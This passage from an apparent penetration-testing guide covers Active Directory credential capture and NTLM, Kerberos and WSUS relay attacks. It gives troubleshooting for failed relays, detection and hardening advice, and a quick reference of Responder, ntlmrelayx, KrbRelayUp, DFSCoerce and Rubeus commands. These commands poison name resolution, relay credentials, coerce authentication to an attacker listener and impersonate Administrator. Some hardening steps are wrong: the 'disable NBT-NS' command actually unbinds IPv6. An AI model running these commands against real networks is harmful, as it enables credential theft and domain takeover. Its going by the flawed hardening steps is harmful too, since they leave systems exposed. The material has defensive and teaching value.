Get-ADComputer DC01 -Properties servicePrincipalName
```

#### Error: "KRB\_AP\_ERR\_SKEW"

**Problem:** Clock skew too large

```
KRB_AP_ERR_SKEW: Clock skew too great
```

**Solution:**

```bash
# Sync time with domain controller
sudo ntpdate dc01.domain.local

# Or manually set time
sudo date -s "2024-12-21 10:15:00"

# Verify synchronization
date
```

**Why it matters:** Kerberos requires time sync within 5 minutes (default MaxClockSkew).

#### Error: "SMB Signing Required"

**Problem:** Target has SMB signing enabled

```
[-] Signing is required on target, cannot relay
```

**Solution:**

```
Option 1: Find targets without signing
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

Option 2: Relay to LDAP instead of SMB
ntlmrelayx.py -t ldap://dc01.domain.local

Option 3: Relay to HTTP services (no signing)
ntlmrelayx.py -t http://webserver.domain.local

Option 4: Use Kerberos relay to LDAP on same host
```

#### Error: "LDAP Bind Failed"

**Problem:** LDAP signing enforced

```
[-] LDAP bind failed: strongerAuthRequired
```

**Solution:**

```
Use LDAPS (requires valid cert):
ntlmrelayx.py -t ldaps://dc01.domain.local

Or relay to AD CS instead:
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs
```

#### Error: Event 4649 - Replay Detected

**Problem:** Service detected duplicate authenticator

```
Event 4649: A replay attack was detected
```

**Cause:** Server's replay cache saw same authenticator twice

**Solution:**

```
1. Block legitimate packet before it arrives:
   - Use firewall rules
   - Faster network positioning
   
2. Win the race:
   - Optimize relay speed
   - Position closer to target
   
3. Wait for cache expiration:
   - Default: 5 minutes
   - Try again after cache clears
```

#### Error: "No Credentials Captured"

**Problem:** Responder running but no hashes captured

**Possible causes:**

**1. No broadcast queries occurring**

```bash
# Verify LLMNR/NBT-NS traffic
tcpdump -i eth0 'udp port 5355 or udp port 137'

# If no traffic, users aren't making naming errors
```

**2. DNS is working properly**

```
Users have no reason to fall back to LLMNR/NBT-NS
Solution: Be patient or use forced authentication
```

**3. Responder configuration issues**

```bash
# Check Responder.conf
cat /etc/responder/Responder.conf

# Ensure protocols are enabled:
SMB = On
HTTP = On
HTTPS = On
LDAP = On
```

**4. Network filtering**

```
Check if IDS/IPS is blocking:
- Responder traffic
- Multiple auth attempts
- Known attack signatures
```

***

### Detection and Defense

#### Detection Indicators

**Network indicators:**

* Multiple failed NTLM authentication attempts from single source
* LLMNR/NBT-NS responses from unexpected IPs
* Unusual traffic to port 8530 (WSUS relay)
* Multiple Kerberos ticket requests for different SPNs same host

**Windows Event Log indicators:**

```
Event ID 4648: Logon using explicit credentials (suspicious source)
Event ID 4649: Replay attack detected (Kerberos)
Event ID 4769: Kerberos service ticket request (multiple SPNs, same source)
Event ID 5140: Network share accessed (from unexpected source)
```

**Kerberos relay specific:**

```
Event 4769 surge for CIFS/, HTTP/, LDAP/ from same IP within seconds
Event 4649 indicating replay detection
Kerberos logon from 127.0.0.1 (relay to local SCM)
```

**LDAP modification indicators:**

```
Event ID 5136: Directory service object modified
Look for changes to:
- msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
- msDS-KeyCredentialLink (Shadow Credentials)
```

#### Hardening Recommendations

**1. Disable LLMNR and NBT-NS:**

```
Group Policy:
Computer Configuration → Administrative Templates → Network → DNS Client
"Turn off multicast name resolution" = Enabled

Registry:
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
DisableSmartNameResolution = 1

PowerShell (disable NBT-NS):
Get-NetAdapter | ForEach-Object { Set-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -Enabled $false }
```

**2. Enable SMB signing (required):**

```
Group Policy:
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
"Microsoft network client: Digitally sign communications (always)" = Enabled
"Microsoft network server: Digitally sign communications (always)" = Enabled

Registry:
HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters
RequireSecuritySignature = 1
HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters
RequireSecuritySignature = 1
```

**3. Enable LDAP signing and channel binding:**

```
Group Policy:
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
"Domain controller: LDAP server signing requirements" = Require signing

Registry:
HKLM\System\CurrentControlSet\Services\NTDS\Parameters
LDAPServerIntegrity = 2 (Require signature)

Enable EPA (Extended Protection for Authentication):
HKLM\System\CurrentControlSet\Services\NTDS\Parameters
LdapEnforceChannelBinding = 2 (Always)
```

**4. Disable WPAD:**

```
Group Policy:
User Configuration → Preferences → Windows Settings → Registry
Create:
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
WpadOverride = 1

Or via IE settings:
Internet Options → Connections → LAN Settings
Uncheck "Automatically detect settings"
```

**5. Restrict machine account creation:**

```
Set ms-DS-MachineAccountQuota = 0

PowerShell:
Set-ADDomain -Identity domain.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

**6. Deploy LAPS:**

```
Prevents local administrator password reuse
Eliminates local admin relay attacks
Automatically rotates passwords
```

**7. Implement network segmentation:**

```
Separate VLANs for:
- Workstations
- Servers
- Domain controllers
Prevents lateral movement via relay
```

**8. Monitor for coercion attempts:**

```
Enable auditing:
- RPC calls to sensitive services
- File share access patterns
- Printer operations
- Certificate requests
```

**9. WSUS hardening:**

```
Migrate from HTTP (8530) to HTTPS (8531)
Require TLS for all WSUS communications
Implement certificate validation
```

**10. Kerberos protections:**

```
Enable AES encryption (disable RC4):
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
"Network security: Configure encryption types allowed for Kerberos" = AES256_HMAC_SHA1, AES128_HMAC_SHA1

Separate SPNs (advanced):
Don't run HTTP, LDAP, CIFS on same machine account
Use separate service accounts for different services
```

***

### Quick Reference

#### Credential Capture Commands

```bash
# Responder - Basic
responder -I eth0

# Responder - Aggressive
responder -I eth0 -P -r -v

# Responder - Downgrade to NTLMv1
responder -I eth0 --lm --disable-ess

# Responder - WPAD
responder -I eth0 --wpad

# Responder - DHCP poisoning
./Responder.py -I eth0 -Pdv

# Dementor - Basic
dementor -I eth0

# Dementor - Analysis mode
dementor -I eth0 -A

# Dementor - Force downgrade
dementor -I eth0 -O NTLM.ExtendedSessionSecurity=Off

# Inveigh - PowerShell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# Inveigh - Binary
Inveigh.exe
```

#### NTLM Relay Commands

```bash
# Basic relay to SMB
ntlmrelayx.py -t smb://TARGET_IP -smb2support

# Relay with command execution
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami"

# Relay with SOCKS proxy
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Relay to LDAP (privilege escalation)
ntlmrelayx.py -t ldap://DC_IP -smb2support --escalate-user USER

# Relay to LDAPS (RBCD)
ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access

# WSUS relay to LDAP
ntlmrelayx.py --http-port 8530 -t ldap://DC_IP -smb2support

# WSUS relay to AD CS
ntlmrelayx.py --http-port 8530 -t http://CA_IP/certsrv/certfnsh.asp --adcs --template Machine

# MultiRelay
python MultiRelay.py -t TARGET_IP -u ALL
python MultiRelay.py -t TARGET_IP -u ALL -c whoami
python MultiRelay.py -t TARGET_IP -u ALL -d
```

#### Kerberos Relay Commands

```cmd
# KrbRelayUp - Automated
.\KrbRelayUp.exe relay --spn "ldap/DC01.domain.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8

# DFSCoerce - Force authentication
.\dfscoerce.exe --target \\DC01.domain.local --listener ATTACKER_IP

# Manual RBCD setup
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HOST/DC01 /ptt
```

#### Reconnaissance Commands

```bash
# Check SMB signing status
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
nmap --script smb2-security-mode -p445 TARGET

# Find WSUS configuration
nxc smb DC_IP -u USER -p PASS -M reg-query -o PATH="HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" KEY="WUServer"

# Scan for WSUS ports
nmap -sSVC -Pn --open -p 8530,8531 TARGET

# Enumerate SPNs for Kerberos relay
Get-ADComputer -Filter * -Properties servicePrincipalName | Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'}
```

#### Attack Prerequisites Checklist

```
NTLM Relay:
☐ SMB signing disabled on target
☐ User has admin rights on target
☐ Can poison or coerce authentication

Kerberos Relay:
☐ Multiple SPNs on same machine
☐ SMB/LDAP signing disabled
☐ Can intercept authentication
☐ Time synchronized (within 5 min)

WSUS Relay:
☐ WSUS uses HTTP (8530), not HTTPS
☐ Layer 2 access for MITM
☐ Can perform ARP/DNS poisoning
```
